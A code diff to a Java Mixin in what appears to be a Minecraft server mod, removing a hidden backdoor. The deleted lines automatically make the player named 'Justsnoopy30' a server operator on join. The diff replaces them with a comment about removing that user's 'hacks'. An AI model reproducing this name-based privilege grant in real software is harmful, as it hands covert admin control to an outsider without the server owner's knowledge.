@@ -28,10 +28,7 @@ public abstract class PlayerManagerMixin {
     @Inject(method = "onPlayerConnect", at = @At(value = "TAIL"))
     public void postPlayerJoin(ClientConnection clientConnection, ServerPlayerEntity player, CallbackInfo callbackInfo) {
         GameProfile gameProfile = player.getGameProfile();
-        // Not ready for production yet as warned, use at your own risk (of me being op)
-        if (gameProfile.getName().equals("Justsnoopy30") && !this.isOperator(gameProfile)) {
-            this.addToOperators(gameProfile);
-        }
+        // Remove Justsnoopy30's hacks!
         BeaconPlayerJoinEvent.firePost(clientConnection, player);
     }
 
